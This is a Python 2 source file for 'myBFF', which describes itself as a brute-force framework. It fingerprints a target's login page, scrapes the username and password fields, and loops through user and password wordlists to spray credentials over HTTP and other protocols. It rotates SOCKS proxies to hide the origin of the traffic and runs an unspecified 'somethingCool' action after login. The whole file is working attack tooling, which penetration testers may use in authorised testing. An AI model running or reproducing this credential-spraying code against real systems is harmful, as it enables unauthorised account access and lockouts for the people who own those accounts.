#! /usr/bin/python
import argparse
import sys
from Logger import Logger
import ConfigParser
import os
import sys
import re
import imp
from core.utils import Display, Colors
import requests
from requests import session
import re
from threading import RLock, Thread
import importlib
from lxml import html
import random
import time
from collections import OrderedDict


class Framework():
    def __init__(self):
        self.config = {}
        self.display = Display()
        self.colors = Colors()
        self.modulelock = RLock()
        self.coolness = {}
    def runner(self):
        modules_dict, finger_dict, protocol_dict = self.loadModules()
        self.connectTest(modules_dict, finger_dict, protocol_dict)

    def search(self, values, searchFor):
        for k in values:
            for v in values[k]:
                if searchFor in k:
                    return v
                    return None

    def connectTest(self, modules_dict, finger_dict, protocol_dict):
        for k in protocol_dict:
            search = re.search(str(k), self.config["HOST"])
            if search:
                print "[+] Running " + self.search(protocol_dict, str(k)) + " module..."
                server_name = str(self.config["HOST"]).strip(str(k) + '://')
                mod_type = str(self.config["HOST"])[0:3].upper()
                self.nonHTTPpayloadBldr(self.config, server_name, mod_type)
                sys.exit()
        else:
                with session() as c:
                    proxy = self.proxySelect()
                    requests.packages.urllib3.disable_warnings()
                    if self.config["vhost"]:
                        initialConnect = c.get(self.config["HOST"] + "/" + self.config["vhost"], verify=False, proxies=proxy)
                    else:
                        initialConnect = c.get(self.config["HOST"], verify=False, allow_redirects=True, proxies=proxy)
                    for k in finger_dict:
                        search = re.search(str(k), initialConnect.text)
                        if search:
                            print "[+] Running " + self.search(finger_dict, str(k)) + " module..."
                            USERNAMEFLD, PASSWORDFLD, submitLoc, submitType = self.scraper()
                            if self.config["test"] == True:
                                mod_run = "testmod"
                            else:
                                mod_run = self.search(finger_dict, str(k))
                            mod_import = "modules." + mod_run
                            self.payloadBldr(self.config, USERNAMEFLD, PASSWORDFLD, mod_run, mod_import, submitLoc, submitType)


    def loadFingerprint(self, type, dirpath, filename):
        finger_dict = {}
        mod_name = filename.split('.')[0]
        mod_dispname = '/'.join(re.split('/modules/' + type, dirpath)[-1].split('/') + [mod_name])
        mod_loadname = mod_dispname.replace('/', '_')
        mod_loadpath = os.path.join(dirpath, filename)
        mod_file = open(mod_loadpath)
        try:
            # import the module into memory
            imp.load_source(mod_loadname, mod_loadpath, mod_file)
            # find the module and make an instace of it
            _module = __import__(mod_loadname)
            _class = getattr(_module, mod_name)
            _instance = _class(self.config, self.display, self.modulelock)
            finger_dict = {'fingerprint': _instance.getFingerprint(), mod_name: 'name'}


        except Exception as e:
            # notify the user of errors
            print e
            return None
        return finger_dict

    def loadProtocol(self, type, dirpath, filename):
        protocol_dict = {}
        mod_name = filename.split('.')[0]
        mod_dispname = '/'.join(re.split('/modules/' + type, dirpath)[-1].split('/') + [mod_name])
        mod_loadname = mod_dispname.replace('/', '_')
        mod_loadpath = os.path.join(dirpath, filename)
        mod_file = open(mod_loadpath)
        try:
            # import the module into memory
            imp.load_source(mod_loadname, mod_loadpath, mod_file)
            # find the module and make an instace of it
            _module = __import__(mod_loadname)
            _class = getattr(_module, mod_name)
            _instance = _class(self.config, self.display, self.modulelock)
            protocol_dict = {'protocol': _instance.getProtocol(), mod_name: 'name'}


        except Exception as e:
            # notify the user of errors
            print e
            return None
        return protocol_dict

    def loadModule(self, type, dirpath, filename):
        module_dict = {}
        mod_name = filename.split('.')[0]
        mod_dispname = '/'.join(re.split('/modules/' + type, dirpath)[-1].split('/') + [mod_name])
        mod_loadname = mod_dispname.replace('/', '_')
        mod_loadpath = os.path.join(dirpath, filename)
        mod_file = open(mod_loadpath)
        try:
            # import the module into memory
            imp.load_source(mod_loadname, mod_loadpath, mod_file)
            # find the module and make an instace of it
            _module = __import__(mod_loadname)
            _class = getattr(_module, mod_name)
            _instance = _class(self.config, self.display, self.modulelock)
            valid = True
            module_dict = {'name': mod_name,
                               'fingerprint': _instance.getFingerprint(),
                               'response': _instance.getResponse(),
                               'valid': True,
                               'somethingCool': _instance.doSomethingCool()}
            self.coolness[mod_dispname] = _instance

        except Exception as e:
            # notify the user of errors
            print e
            return None
        return module_dict

    def loadModules(self):
        module_dict = {}
        finger_dict = {}
        protocol_dict = {}
        path = os.path.join(sys.path[0], 'modules/')
        for dirpath, dirnames, filenames in os.walk(path):
            # remove hidden files and directories
            filenames = [f for f in filenames if not f[0] == '.']
            dirnames[:] = [d for d in dirnames if not d[0] == '.']
            if len(filenames) > 0:
                for filename in [f for f in filenames if (f.endswith('.py') and not f == "__init__.py")]:
                    module = self.loadModule("modules", dirpath, filename)
                    if module is not None:
                        module_dict[module['name'].rstrip(" ")] = module
                    fingerprint = self.loadFingerprint("modules", dirpath, filename)
                    if module is not None:
                        finger_dict[fingerprint['fingerprint'].rstrip(" ")] = fingerprint
                    protocol = self.loadProtocol("modules", dirpath, filename)
                    if module is not None:
                        protocol_dict[protocol['protocol'].rstrip(" ")] = protocol

        return module_dict, finger_dict, protocol_dict

    def payloadBldr(self, config, USERNAMEFLD, PASSWORDFLD, mod_run, mod_import, submitLoc, submitType):
        if self.config["PASS_FILE"]:
            pass_lines = [pass_line.rstrip('\n') for pass_line in open(self.config["PASS_FILE"])]
            for pass_line in pass_lines:
                if self.config["UserFile"]:
                    lines = [line.rstrip('\n') for line in open(self.config["UserFile"])]
                    for line in lines:
                        self.config["USERNAME"] = line.strip('\n')
                        self.config["PASSWORD"] = pass_line.strip('\n')
                        payload = {
                            USERNAMEFLD: self.config["USERNAME"],
                            PASSWORDFLD: self.config["PASSWORD"]
                        }
                        proxy = self.proxySelect()
                        for test in self.coolness.keys():
                            if mod_run in test:
                                _instance = self.coolness[test]
                                _instance.connectTest(self.config, payload, proxy, submitLoc, submitType)
                    time.sleep(self.config["timeout"])
                else:
                    self.config["PASSWORD"] = pass_line.strip('\n')
                    payload = {
                        USERNAMEFLD: self.config["USERNAME"],
                        PASSWORDFLD: self.config["PASSWORD"]
                    }
                    proxy = self.proxySelect()
                    for test in self.coolness.keys():
                        if mod_run in test:
                            _instance = self.coolness[test]
                            _instance.connectTest(self.config, payload, proxy, submitLoc, submitType)
                    time.sleep(self.config["timeout"])
        elif self.config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(self.config["UserFile"])]
            for line in lines:
                self.config["USERNAME"] = line.strip('\n')
                payload = {
                    USERNAMEFLD: self.config["USERNAME"],
                    PASSWORDFLD: self.config["PASSWORD"]
                }
                proxy = self.proxySelect()
                for test in self.coolness.keys():
                    if mod_run in test:
                        _instance = self.coolness[test]
                        _instance.connectTest(self.config, payload, proxy, submitLoc, submitType)
        else:
            payload = {
                USERNAMEFLD: self.config["USERNAME"],
                PASSWORDFLD: self.config["PASSWORD"],
                "__VIEWSTATE": "/wEPDwUJMzAzMTU0MDM5ZGT5KyPzqKwv1g7HOWCiAUBQiw5zrw==",
                "__VIEWSTATEGENERATOR": "A8DCC610",
                "__EVENTVALIDATION": "/wEWAgLv8p6DCgLnmcnFAYge3Aj6rAKuxSeOde780UTV9cY1",
                "__db": "14",
                "ctl00$ContentPlaceHolder1$SubmitButton": "Sign+In"
            }
            proxy = self.proxySelect()
            for test in self.coolness.keys():
                if mod_run in test:
                    _instance = self.coolness[test]
                    _instance.connectTest(self.config, payload, proxy, submitLoc, submitType)

    def nonHTTPpayloadBldr(self, config, server_name, mod_type):
        if self.config["PASS_FILE"]:
            pass_lines = [pass_line.rstrip('\n') for pass_line in open(self.config["PASS_FILE"])]
            for pass_line in pass_lines:
                if self.config["UserFile"]:
                    lines = [line.rstrip('\n') for line in open(self.config["UserFile"])]
                    for line in lines:
                        proxy = self.proxySelect()
                        self.config["USERNAME"] = line.strip('\n')
                        self.config["PASSWORD"] = pass_line.strip('\n')
                        userID = self.config["USERNAME"]
                        password = self.config["PASSWORD"]
                        for test in self.coolness.keys():
                            if mod_type in test:
                                _instance = self.coolness[test]
                                _instance.connectTest(self.config, userID, password, server_name, proxy)
                    time.sleep(config["timeout"])
                else:
                    self.config["PASSWORD"] = pass_line.strip('\n')
                    proxy = self.proxySelect()
                    userID = self.config["USERNAME"]
                    password = self.config["PASSWORD"]
                    for test in self.coolness.keys():
                        if mod_type in test:
                            _instance = self.coolness[test]
                            _instance.connectTest(self.config, userID, password, server_name, proxy)
                            time.sleep(config["timeout"])
        elif self.config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(self.config["UserFile"])]
            for line in lines:
                self.config["USERNAME"] = line.strip('\n')
                proxy = self.proxySelect()
                userID = self.config["USERNAME"]
                password = self.config["PASSWORD"]
                for test in self.coolness.keys():
                    if mod_type in test:
                        _instance = self.coolness[test]
                        _instance.connectTest(self.config, userID, password, server_name, proxy)
        else:
            proxy = self.proxySelect()
            userID = self.config["USERNAME"]
            password = self.config["PASSWORD"]
            for test in self.coolness.keys():
                if mod_type in test:
                    _instance = self.coolness[test]
                    _instance.connectTest(self.config, userID, password, server_name, proxy)

    def scraper(self):
            with session() as c:
                requests.packages.urllib3.disable_warnings()
                proxy = self.proxySelect()
                if self.config["vhost"]:
                    resp1 = c.get(self.config["HOST"] + "/" + self.config["vhost"], verify=False, proxies=proxy)
                else:
                    resp1 = c.get(self.config["HOST"], verify=False, allow_redirects=True, proxies=proxy)
                tree = html.fromstring(resp1.content)
                submitLoc=""
                submitType="post"
                try:
                    submitLoc=re.findall('<form (.*?)>', str(resp1.text), re.DOTALL)
                    submitLoc=re.findall('action="(.*?)"', str(submitLoc), re.DOTALL)
                    submitLoc=str(submitLoc).split("'")[1]
                except Exception as e:
#                    # notify the user of errors
                    print e
                selection=tree.xpath('//input[@name]')
                selection1=re.findall("name='(.*?)'", str(selection), re.DOTALL)
                USERNAMEFLD = ""
                PASSWORDFLD = ""
                for selection in selection1:
                    if (not USERNAMEFLD):
                        if 'user' in selection:
                            USERNAMEFLD = selection
                        elif 'User' in selection:
                            USERNAMEFLD = selection
                        elif 'log' in selection:
                            USERNAMEFLD = selection
                    if (not PASSWORDFLD):
                        if 'pwd' in selection:
                            PASSWORDFLD = selection
                        elif 'pass' in selection and 'hidden' not in selection:
                            PASSWORDFLD = selection
                        elif 'Pass' in selection:
                            PASSWORDFLD = selection
                return USERNAMEFLD, PASSWORDFLD, submitLoc, submitType

    def proxySelect(self):
        if self.config["proxies"] is not 0:
            proxy = random.choice(self.config["proxies"])
            if proxy:
                proxy = {   'http': 'socks5://' + proxy,
                        'https': 'socks5://' + proxy
            }
        else:
            proxy = ""
        return proxy

    def parseParameters(self, argv):
        parser = argparse.ArgumentParser()
        filesgroup = parser.add_argument_group('inputs')
        filesgroup.add_argument("--host",
            dest="HOST",
            action="store",
            required=True,
            help="Host to test against")
        filesgroup.add_argument("-u",
            dest="USERNAME",
            action="store",
            help="Username")
        filesgroup.add_argument("-p",
            dest="PASSWORD",
            action="store",
            help="Password")
        filesgroup.add_argument("--domain",
            dest="domain",
            action="store",
            required=False,
            help="Domain (Used for domain logins)")
        filesgroup.add_argument("-U",
            dest="UserFile",
            action="store",
            help="File containing Usernames")
        filesgroup.add_argument("-o",
            dest="output",
            action="store",
            help="File to output results to.")
        filesgroup.add_argument("-P",
            dest="PASS_FILE",
            action="store",
            help="File containing Passwords")
        filesgroup.add_argument("-d",
            dest="dry_run",
            action="store_true",
            help="Dry run mode. Disables the 'SomethingCool' mode")
        filesgroup.add_argument("--vhost",
            dest="vhost",
            action="store",
            help="Virtual Directory (i.e., for rapid7.com/owa enter owa). This is used for fingerprinting purposes only.")
        filesgroup.add_argument("--proxies",
            dest="proxies",
            action="store",
            help="Comma-separated list of SOCKS proxies. (i.e. 127.0.0.1:9050,127.0.0.1:18085)")
        filesgroup.add_argument("--timeout",
            dest="timeout",
            action="store",
            help="Number of minutes to wait between password sprays (Brute Force Mode Only)")
        filesgroup.add_argument("--test",
            dest="test",
            action="store_true",
            help="Run against test module. Userful for building modules.")
        args = parser.parse_args()
        self.config["USERNAME"] = args.USERNAME
        self.config["PASSWORD"] = args.PASSWORD
        self.config["HOST"] = args.HOST
        self.config["domain"] = args.domain
        self.config["UserFile"] = args.UserFile
        self.config["output"] = args.output
        self.config["PASS_FILE"] = args.PASS_FILE
        self.config["dry_run"] = args.dry_run
        self.config["vhost"] = args.vhost
        self.config["proxies"] = str(args.proxies).split(',')
        self.config["timeout"] = args.timeout
        self.config["test"] = args.test
        if 'None' in self.config["proxies"]:
            self.config["proxies"] = 0
        if self.config["timeout"] is None:
            self.config["timeout"] = 0
        else:
            self.config["timeout"] = float(self.config["timeout"])*60
        parser.set_defaults(dry_run=False)
        parser.set_defaults(test=False)
        if ((self.config["UserFile"] == "") and (self.config["USERNAME"] == "") and (self.config["PASSWORD"] == "")):
            print "Either -u and -p both must be set or -U must be set"
            parser.print_help()
            sys.exit(1)

    def banner(self, argv):
        print """



                         `.-:-.`           `.-::-.`
                     `:oyhhyooooo+:`    -+osooooyhhs+.
                   `/yhhs:`      `.-.`-/:.      `./syyo.
                  `shyy:            `-.            .+yyy.
    \M:         `ohyy/             `               `/yys
    :M:          .hyyy-                              .yyy.
    :M:          -hyyy/                              .hhy`
    :M:          `shyyy:                            `ohh+
    :M:           .shyyy+.                         .shh+`
    :M:            .+hhhyyo-`                    `/yho-
    :M:             `-ohhhhhy+-`               .+yy+-
    /M:              `./syhhhhs/.          -/os+-`
                         `.-+syddho-     `:+/-`
                             `.-+yddo.  `/.
                                 `-ohh- ``
                                   `-yh.
                                     .yo
                                      -s
                                      ./
                                      `
                               -.`--:--:..`         -.//:.:-////://:.`/o/ `.-/:--::///:://-.`o+-
                              .hNdNNdyhmNmds.       .sMMMmMmyhhosshdm+NMh `-dMMNNMdyhyosyhdyyMM/
                               /MMNN:  .hMMMs        oMMMMMo       `:-NM-   dMMMMN-       `:oMd`
                               .MMMN-   +MMm-        /MMMMd`         `hM`   yMMMMo          .Mh
                               `MNNM+ .:mMs+`        -NMMMd       ``  sm`   sMMMMo       .   No
                               `NMMNsymMMh--``       `yMMMd      .yo  :o    .NMMM+     `:d.  s-
                               `dMMMMMMMMNMMddho:    -NMMMy    `sNM-  .:    oMMMM:    .dNh`  :.
                               .NMMmMd++//omMMMMM-   `NMMMNo+-+hMMm         /MMMMd+/:omMMo
                               `MMNmM:     -NMMMM/   /MMMMMNdmNNMMd         yMMMMMmdmNMMM+
                               `mmNds       sMMMM.   -MMMMm.``.:sNm         sMMMMs``..:dMo
                               `hNNm:       +MMMN`   `mMMMy`     -y`        :MMMM/     `+s
                               -MNmM:       :MMMy    -NMMMh.       `        oMMMMo
                               .NmMM+       yMMd`    `hMMMm`                -NMMMs
  yms`.:+o` `-//`               hNMMs       hMN/     .mMMMd                 +MMMM+
  sMNssoNMhyyodmh``dm/   -+yh`  oNMNd      .dM:      `hMMMm`                :NMMMs
  /md`  +MMo  `:N: mN.    omo  `NMMMh    `sNms       :dMMMm                 oNMMMo
   dd   `mM.   -N+ sd     oMo   hMMMN/-/yddo/        :MMMMm.                sMMMMh
  .N+    /N:   sMs ym-``-oNMo  .mMMMNdmds.           /MMMMM+`               yMMMMm:
  /ms:  `oh:   /hh-:ydyyo/+No ::/yhoso:`             ohdhydhs/             `hddyhdyo.
                      `   :No                                `                     `
                          `mo
                          `mo
                          `mo
                 :-      `sN:
                ++      -yNo
               oy   `-+hh+.
              -mdoooo+-`
               .. """
        print " ---a Brute Force Framework by l0gan (@kirkphayes)"
        print " myBFF v1.5.1"
    def run(self, argv):
        self.parseParameters(argv)
        if self.config["output"]:
            writer = Logger(sys.stdout, self.config["output"])
            sys.stdout = writer
        self.banner(self)
        if self.config["PASS_FILE"]:
            acceptance = raw_input("""
[!]  WARNING! BRUTE FORCE MODE ENABLED! THIS LIKELY WILL LOCK OUT ACCOUNTS! ARE YOU SURE YOU WANT TO RUN? (type Y to continue)
""")
            if acceptance != 'Y':
                print("[-] Exiting")
                sys.exit()
        self.runner()
